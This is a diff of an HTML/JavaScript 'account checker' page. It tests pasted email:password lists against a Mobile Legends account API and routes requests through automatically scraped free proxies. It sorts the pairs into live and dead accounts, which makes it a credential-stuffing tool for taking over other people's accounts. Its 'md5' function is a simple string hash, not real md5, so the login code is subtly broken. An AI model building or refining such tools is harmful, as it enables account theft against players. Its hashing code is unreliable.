@@ -1,224 +1,694 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Moonton Checker Pro</title>
+    <title>MOONTON PRO - Account Checker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg-dark: #0a0a0f;
+            --bg-panel: #12121a;
+            --bg-card: #1a1a25;
+            --accent: #00f0ff;
+            --accent2: #ff00aa;
+            --accent3: #00ff88;
+            --text: #e0e0e0;
+            --text-dim: #808090;
+            --border: #2a2a3a;
+        }
+        
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: #0f0f1a; 
-            color: #e0e0e0;
+        
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text);
             min-height: 100vh;
-            padding: 20px;
-        }
-        .container { max-width: 900px; margin: 0 auto; }
-        h1 { text-align: center; color: #6366f1; margin-bottom: 20px; }
-        
-        .card {
-            background: #1a1a2e;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .card h2 {
-            color: #6366f1;
-            margin-bottom: 15px;
-            font-size: 16px;
+            background-image: 
+                radial-gradient(ellipse at 20% 80%, rgba(0,240,255,0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(255,0,170,0.08) 0%, transparent 50%),
+                linear-gradient(180deg, #0a0a0f 0%, #0f0f18 100%);
         }
         
-        textarea {
-            width: 100%;
-            height: 150px;
-            background: #242442;
-            border: 1px solid #3f3f5a;
-            border-radius: 8px;
-            color: #e0e0e0;
-            padding: 10px;
-            font-family: monospace;
-        }
-        
-        .row { display: flex; gap: 10px; margin-bottom: 15px; }
-        .col { flex: 1; }
-        
-        label { display: block; margin-bottom: 5px; font-size: 14px; }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            background: #242442;
-            border: 1px solid #3f3f5a;
-            border-radius: 8px;
-            color: #e0e0e0;
-        }
-        
-        .btn {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .btn-primary { background: #6366f1; color: white; }
-        .btn-success { background: #22c55e; color: white; }
-        .btn-danger { background: #ef4444; color: white; }
-        .btn-warning { background: #f59e0b; color: black; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        .btn-group { display: flex; gap: 10px; margin-bottom: 15px; }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            text-align: center;
-        }
-        .stat-box {
-            background: #242442;
-            padding: 15px;
-            border-radius: 8px;
-        }
-        .stat-value { font-size: 24px; font-weight: bold; }
-        .stat-label { font-size: 12px; opacity: 0.7; }
-        .live .stat-value { color: #22c55e; }
-        .dead .stat-value { color: #ef4444; }
-        
-        .progress {
-            height: 8px;
-            background: #242442;
-            border-radius: 4px;
+        .header {
+            background: linear-gradient(90deg, var(--bg-panel) 0%, var(--bg-dark) 100%);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: relative;
             overflow: hidden;
-            margin: 15px 0;
-        }
-        .progress-bar {
-            height: 100%;
-            background: #6366f1;
-            transition: width 0.3s;
         }
         
-        .checkbox {
+        .header::before {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3));
+        }
+        
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 3px;
+        }
+        
+        .logo span { font-weight: 400; -webkit-text-fill-color: var(--text); }
+        
+        .status-pill {
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-bottom: 8px;
+            font-size: 12px;
+            color: var(--text-dim);
         }
-        .checkbox input { width: auto; }
         
-        .status-bar {
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        
+        .main-container {
+            display: grid;
+            grid-template-columns: 300px 1fr 320px;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+            padding: 20px;
+            min-height: calc(100vh - 70px);
+        }
+        
+        .panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        
+        .panel-header {
+            background: var(--bg-card);
+            padding: 12px 15px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
             display: flex;
-            justify-content: space-between;
-            padding: 10px;
-            background: #242442;
-            border-radius: 8px;
-            margin-top: 15px;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .panel-body {
+            padding: 15px;
+        }
+        
+        /* LEFT SIDEBAR */
+        .sidebar-left {
+            grid-row: 1 / 3;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .sidebar-left .panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .sidebar-left .panel-body {
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        /* OPTIONS */
+        .option-group {
+            margin-bottom: 15px;
+        }
+        
+        .option-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+        
+        .option-row {
+            display: block;
+            margin-bottom: 10px;
+        }
+        
+        .toggle {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            padding: 8px 12px;
+            background: var(--bg-card);
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+        
+        .toggle:hover {
+            background: var(--bg-dark);
+        }
+        
+        .toggle input {
+            display: none;
+        }
+        
+        .toggle-switch {
+            width: 36px;
+            height: 20px;
+            background: var(--bg-dark);
+            border-radius: 10px;
+            position: relative;
+            transition: all 0.3s;
+        }
+        
+        .toggle-switch::before {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            background: var(--text-dim);
+            border-radius: 50%;
+            top: 2px;
+            left: 2px;
+            transition: all 0.3s;
+        }
+        
+        .toggle input:checked + .toggle-switch {
+            background: var(--accent);
+        }
+        
+        .toggle input:checked + .toggle-switch::before {
+            left: 18px;
+            background: var(--bg-dark);
+        }
+        
+        .toggle-text {
             font-size: 13px;
         }
         
-        .result-box {
-            background: #242442;
-            padding: 10px;
-            border-radius: 8px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 12px;
+        .input-group {
+            margin-bottom: 12px;
         }
-        .result-item { padding: 5px 0; border-bottom: 1px solid #3f3f5a; }
-        .live-item { color: #22c55e; }
-        .dead-item { color: #ef4444; }
+        
+        .input-field {
+            width: 100%;
+            padding: 10px 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 13px;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+        
+        .input-field::placeholder {
+            color: var(--text-dim);
+        }
+        
+        select.input-field {
+            cursor: pointer;
+        }
+        
+        /* BUTTONS */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+        }
+        
+        .btn-scrape {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: #000;
+            width: 100%;
+        }
+        
+        .btn-scrape:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(245,158,11,0.3);
+        }
+        
+        .btn-scrape:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), #00c8d4);
+            color: #000;
+            flex: 1;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0,240,255,0.3);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: #fff;
+            flex: 1;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        /* CENTER */
+        .center-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .accounts-panel .panel-body {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        textarea.accounts-input {
+            flex: 1;
+            width: 100%;
+            min-height: 200px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            padding: 15px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            resize: none;
+            line-height: 1.6;
+        }
+        
+        textarea.accounts-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+        
+        /* STATS GRID */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        
+        .stat-card {
+            background: var(--bg-card);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--border);
+        }
+        
+        .stat-card.total::before { background: var(--text-dim); }
+        .stat-card.live::before { background: var(--accent3); }
+        .stat-card.dead::before { background: var(--accent2); }
+        .stat-card.rate::before { background: var(--accent); }
+        
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .stat-card.total .stat-value { color: var(--text); }
+        .stat-card.live .stat-value { color: var(--accent3); }
+        .stat-card.dead .stat-value { color: var(--accent2); }
+        .stat-card.rate .stat-value { color: var(--accent); }
+        
+        .stat-label {
+            font-size: 10px;
+            letter-spacing: 1px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+        }
+        
+        /* PROGRESS */
+        .progress-container {
+            background: var(--bg-card);
+            border-radius: 8px;
+            padding: 3px;
+            margin-top: 15px;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 6px;
+            width: 0%;
+            transition: width 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        /* RIGHT SIDEBAR */
+        .sidebar-right {
+            grid-row: 1 / 3;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .sidebar-right .panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .result-list {
+            flex: 1;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 11px;
+        }
+        
+        .result-item {
+            padding: 8px 10px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .result-item:last-child {
+            border-bottom: none;
+        }
+        
+        .result-item.live {
+            border-left: 3px solid var(--accent3);
+        }
+        
+        .result-item.dead {
+            border-left: 3px solid var(--accent2);
+        }
+        
+        .result-icon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+        }
+        
+        .result-item.live .result-icon {
+            background: var(--accent3);
+            color: #000;
+        }
+        
+        .result-item.dead .result-icon {
+            background: var(--accent2);
+            color: #fff;
+        }
+        
+        .result-text {
+            flex: 1;
+            word-break: break-all;
+        }
+        
+        /* LOG PANEL */
+        .log-panel .panel-body {
+            height: 150px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 10px;
+        }
+        
+        .log-entry {
+            padding: 4px 0;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-dim);
+        }
+        
+        .log-time {
+            color: var(--accent);
+            margin-right: 8px;
+        }
+        
+        /* PROXY STATUS */
+        .proxy-status {
+            background: var(--bg-card);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .proxy-count {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            color: var(--accent);
+        }
+        
+        .proxy-label {
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 1200px) {
+            .main-container {
+                grid-template-columns: 1fr 1fr;
+                grid-template-rows: auto auto auto;
+            }
+            
+            .sidebar-left { grid-row: 1; grid-column: 1 / 3; }
+            .center-panel { grid-row: 2; grid-column: 1 / 3; }
+            .sidebar-right { grid-row: 3; grid-column: 1 / 3; }
+        }
+        
+        @media (max-width: 768px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar-left, .center-panel, .sidebar-right {
+                grid-column: 1;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚔️ Moonton Checker Pro</h1>
-        
-        <!-- Proxy Section -->
-        <div class="card">
-            <h2>🌐 Proxy Settings</h2>
-            <div class="row">
-                <div class="col">
-                    <label>Loaded Proxies</label>
-                    <input type="text" id="proxyCount" value="0" readonly>
+    <header class="header">
+        <div class="logo">MOONTON<span>PRO</span></div>
+        <div class="status-pill">
+            <div class="status-dot"></div>
+            <span>READY</span>
+        </div>
+    </header>
+    
+    <div class="main-container">
+        <!-- LEFT SIDEBAR -->
+        <div class="sidebar-left">
+            <div class="panel">
+                <div class="panel-header">
+                    <span>⚙</span> SETTINGS
+                </div>
+                <div class="panel-body">
+                    <div class="option-group">
+                        <div class="option-label">PROXY CONFIG</div>
+                        
+                        <label class="toggle option-row">
+                            <input type="checkbox" id="useProxy">
+                            <div class="toggle-switch"></div>
+                            <span class="toggle-text">Use Proxies</span>
+                        </label>
+                        
+                        <label class="toggle option-row">
+                            <input type="checkbox" id="autoRescrape" checked>
+                            <div class="toggle-switch"></div>
+                            <span class="toggle-text">Auto-Rescrape</span>
+                        </label>
+                    </div>
+                    
+                    <div class="input-group">
+                        <div class="option-label">THREADS</div>
+                        <input type="number" class="input-field" id="threads" value="20" min="1" max="100">
+                    </div>
+                    
+                    <button class="btn btn-scrape" id="scrapeBtn" onclick="scrapeProxies()">
+                        <span>🕷</span> SCRAPE PROXIES
+                    </button>
+                    
+                    <div class="proxy-status">
+                        <div>
+                            <div class="proxy-count" id="proxyCount">0</div>
+                            <div class="proxy-label">PROXIES LOADED</div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <div class="checkbox">
-                <input type="checkbox" id="useProxy">
-                <label>Use Proxies</label>
-            </div>
-            <div class="checkbox">
-                <input type="checkbox" id="autoRescrape" checked>
-                <label>Auto Rescrape when exhausted</label>
-            </div>
-            <div class="btn-group">
-                <button class="btn btn-warning" id="scrapeBtn" onclick="scrapeProxies()">🕷️ Start Scrape</button>
-            </div>
-            <div id="proxyStatus" class="status-bar">
-                <span>Click Start Scrape to begin</span>
+            
+            <div class="panel">
+                <div class="panel-header">
+                    <span>📋</span> LOG
+                </div>
+                <div class="panel-body log-panel">
+                    <div id="logList"></div>
+                </div>
             </div>
         </div>
         
-        <!-- Account Input -->
-        <div class="card">
-            <h2>📝 Accounts (email:password or email|password)</h2>
-            <textarea id="accounts" placeholder="test@test.com:password123&#10;test2@test2.com:password456"></textarea>
-            <div class="row" style="margin-top: 15px;">
-                <div class="col">
-                    <label>Threads</label>
-                    <input type="number" id="threads" value="20">
+        <!-- CENTER -->
+        <div class="center-panel">
+            <div class="panel accounts-panel">
+                <div class="panel-header">
+                    <span>📝</span> ACCOUNTS
+                </div>
+                <div class="panel-body">
+                    <textarea class="accounts-input" id="accounts" placeholder="email:password&#10;email|password"></textarea>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-primary" id="startBtn" onclick="startCheck()">
+                            <span>▶</span> START
+                        </button>
+                        <button class="btn btn-danger" id="stopBtn" onclick="stopCheck()" disabled>
+                            <span>■</span> STOP
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="panel">
+                <div class="panel-header">
+                    <span>📊</span> PROGRESS
+                </div>
+                <div class="panel-body">
+                    <div class="stats-grid">
+                        <div class="stat-card total">
+                            <div class="stat-value" id="totalCount">0</div>
+                            <div class="stat-label">TOTAL</div>
+                        </div>
+                        <div class="stat-card live">
+                            <div class="stat-value" id="liveCount">0</div>
+                            <div class="stat-label">LIVE</div>
+                        </div>
+                        <div class="stat-card dead">
+                            <div class="stat-value" id="deadCount">0</div>
+                            <div class="stat-label">DEAD</div>
+                        </div>
+                        <div class="stat-card rate">
+                            <div class="stat-value" id="rateText">0%</div>
+                            <div class="stat-label">RATE</div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-container">
+                        <div class="progress-bar" id="progressBar"></div>
+                    </div>
                 </div>
             </div>
         </div>
         
-        <!-- Controls -->
-        <div class="btn-group">
-            <button class="btn btn-success" id="startBtn" onclick="startCheck()">▶ Start Checking</button>
-            <button class="btn btn-danger" id="stopBtn" onclick="stopCheck()" disabled>■ Stop</button>
-        </div>
-        
-        <!-- Progress -->
-        <div class="card">
-            <div class="stats">
-                <div class="stat-box">
-                    <div class="stat-value" id="totalCount">0</div>
-                    <div class="stat-label">Total</div>
+        <!-- RIGHT SIDEBAR -->
+        <div class="sidebar-right">
+            <div class="panel">
+                <div class="panel-header">
+                    <span>✓</span> LIVE
                 </div>
-                <div class="stat-box live">
-                    <div class="stat-value" id="liveCount">0</div>
-                    <div class="stat-label">Live</div>
-                </div>
-                <div class="stat-box dead">
-                    <div class="stat-value" id="deadCount">0</div>
-                    <div class="stat-label">Dead</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="statusText">Ready</div>
-                    <div class="stat-label">Status</div>
+                <div class="panel-body">
+                    <div class="result-list" id="liveResults"></div>
                 </div>
             </div>
-            <div class="progress">
-                <div class="progress-bar" id="progressBar" style="width: 0%"></div>
+            
+            <div class="panel">
+                <div class="panel-header">
+                    <span>✗</span> DEAD
+                </div>
+                <div class="panel-body">
+                    <div class="result-list" id="deadResults"></div>
+                </div>
             </div>
-        </div>
-        
-        <!-- Results -->
-        <div class="card">
-            <h2>✓ Live Results</h2>
-            <div id="liveResults" class="result-box"></div>
-        </div>
-        
-        <div class="card">
-            <h2>✗ Dead Results</h2>
-            <div id="deadResults" class="result-box"></div>
         </div>
     </div>
     
     <script>
-        let checking = false;
-        
-        function log(msg) {
-            document.getElementById('proxyStatus').innerHTML = '<span>' + msg + '</span>';
-        }
-        
         // === PROXY SCRAPER ===
         const PROXY_SOURCES = [
             'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000',
@@ -228,12 +698,19 @@
         ];
         
         let proxies = [];
+        let checking = false;
+        
+        function log(msg) {
+            const time = new Date().toTimeString().split(' ')[0];
+            const div = document.getElementById('logList');
+            div.innerHTML = '<div class="log-entry"><span class="log-time">' + time + '</span>' + msg + '</div>' + div.innerHTML;
+        }
         
         async function scrapeProxies() {
             const btn = document.getElementById('scrapeBtn');
             btn.disabled = true;
-            btn.innerHTML = '🕷️ Scraping...';
-            log('Scraping proxies...');
+            btn.innerHTML = '<span>⏳</span> SCRAPING...';
+            log('Starting proxy scrape...');
             
             proxies = [];
             
@@ -241,36 +718,30 @@
                 try {
                     const r = await fetch(url);
                     const text = await r.text();
-                    const lines = text.split('\\n');
+                    const lines = text.split('\n');
                     
                     for (const line of lines) {
-                        const line2 = line.trim();
-                        if (line2.includes(':') && line2.split(':').length === 2) {
-                            const parts = line2.split(':');
+                        const l = line.trim();
+                        if (l.includes(':') && l.split(':').length === 2) {
+                            const parts = l.split(':');
                             const port = parseInt(parts[1]);
                             if (!isNaN(port) && port > 0 && port < 65536) {
-                                proxies.push(line2);
+                                proxies.push(l);
                             }
                         }
                     }
                 } catch (e) {
-                    console.log('Error:', e);
+                    log('Error: ' + e.message);
                 }
             }
             
-            // Dedupe
             proxies = [...new Set(proxies)];
-            
-            document.getElementById('proxyCount').value = proxies.length;
+            document.getElementById('proxyCount').textContent = proxies.length;
             document.getElementById('useProxy').checked = true;
             
             btn.disabled = false;
-            btn.innerHTML = '🕷️ Start Scrape';
+            btn.innerHTML = '<span>🕷</span> SCRAPE PROXIES';
             log('Scraped ' + proxies.length + ' proxies');
-            
-            if (proxies.length > 0) {
-                document.getElementById('useProxy').checked = true;
-            }
         }
         
         function getProxy(index) {
@@ -282,11 +753,9 @@
         const API_URL = 'https://accountmtapi.mobilelegends.com/';
         
         function md5(str) {
-            // Simple hash for demo - in real use you'd use a proper md5
             let hash = 0;
             for (let i = 0; i < str.length; i++) {
-                const char = str.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                 hash = hash & hash;
             }
             return Math.abs(hash).toString(16);
@@ -326,7 +795,6 @@
                 const r = await fetch(API_URL, opts);
                 return r.ok;
             } catch (e) {
-                console.log('Error:', e);
                 return false;
             }
         }
@@ -334,49 +802,42 @@
         async function startCheck() {
             const accounts = document.getElementById('accounts').value.trim();
             if (!accounts) {
-                alert('Please enter accounts');
+                alert('Enter accounts first');
                 return;
             }
             
             const useProxy = document.getElementById('useProxy').checked;
             const autoRescrape = document.getElementById('autoRescrape').checked;
-            const threads = parseInt(document.getElementById('threads').value);
             
-            // Parse accounts
             const accList = [];
-            for (const line of accounts.split('\\n')) {
-                const line2 = line.trim();
-                if (!line2 || line2.startsWith('#')) continue;
-                if (line2.includes('|')) {
-                    const parts = line2.split('|');
+            for (const line of accounts.split('\n')) {
+                const l = line.trim();
+                if (!l || l.startsWith('#')) continue;
+                if (l.includes('|')) {
+                    const parts = l.split('|');
                     if (parts.length >= 2) accList.push([parts[0], parts[1]]);
-                } else if (line2.includes(':')) {
-                    const parts = line2.split(':');
+                } else if (l.includes(':')) {
+                    const parts = l.split(':');
                     if (parts.length >= 2) accList.push([parts[0], parts[1]]);
                 }
             }
             
-            if (!accList.length) {
-                alert('No valid accounts');
-                return;
-            }
+            if (!accList.length) return;
             
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
             checking = true;
             
+            log('Checking ' + accList.length + ' accounts...');
+            
             const live = [];
             const dead = [];
-            let checked = 0;
             let proxyIndex = 0;
-            
-            log('Checking ' + accList.length + ' accounts...');
             
             for (const [email, pw] of accList) {
                 if (!checking) break;
                 
                 if (useProxy && autoRescrape && proxyIndex >= proxies.length) {
-                    // Auto rescrape
                     await scrapeProxies();
                     proxyIndex = 0;
                 }
@@ -385,7 +846,6 @@
                 proxyIndex++;
                 
                 const isLive = await checkAccount(email, pw, proxy, useProxy);
-                checked++;
                 
                 if (isLive) {
                     live.push(email + ':' + pw);
@@ -393,25 +853,16 @@
                     dead.push(email + ':' + pw);
                 }
                 
-                // Update UI
-                document.getElementById('totalCount').textContent = accList.length;
-                document.getElementById('liveCount').textContent = live.length;
-                document.getElementById('deadCount').textContent = dead.length;
-                const percent = (checked / accList.length) * 100;
-                document.getElementById('progressBar').style.width = percent + '%';
+                updateStats(accList.length, live.length, dead.length);
             }
             
-            // Results
-            document.getElementById('liveResults').innerHTML = 
-                live.map(x => '<div class="result-item live-item">' + x + '</div>').join('');
-            document.getElementById('deadResults').innerHTML = 
-                dead.map(x => '<div class="result-item dead-item">' + x + '</div>').join('');
+            displayResults(live, dead);
             
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
             checking = false;
             
-            log('Done! Live: ' + live.length + ', Dead: ' + dead.length);
+            log('Complete! Live: ' + live.length + ', Dead: ' + dead.length);
         }
         
         function stopCheck() {
@@ -419,6 +870,31 @@
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
             log('Stopped');
+        }
+        
+        function updateStats(total, live, dead) {
+            document.getElementById('totalCount').textContent = total;
+            document.getElementById('liveCount').textContent = live;
+            document.getElementById('deadCount').textContent = dead;
+            
+            const rate = total > 0 ? Math.round((live / (live + dead)) * 100) : 0;
+            document.getElementById('rateText').textContent = rate + '%';
+            
+            const percent = (live + dead) / total * 100;
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+        
+        function displayResults(live, dead) {
+            const liveDiv = document.getElementById('liveResults');
+            const deadDiv = document.getElementById('deadResults');
+            
+            liveDiv.innerHTML = live.map(function(x) {
+                return '<div class="result-item live"><div class="result-icon">✓</div><div class="result-text">' + x + '</div></div>';
+            }).join('');
+            
+            deadDiv.innerHTML = dead.map(function(x) {
+                return '<div class="result-item dead"><div class="result-icon">✗</div><div class="result-text">' + x + '</div></div>';
+            }).join('');
         }
     </script>
 </body>
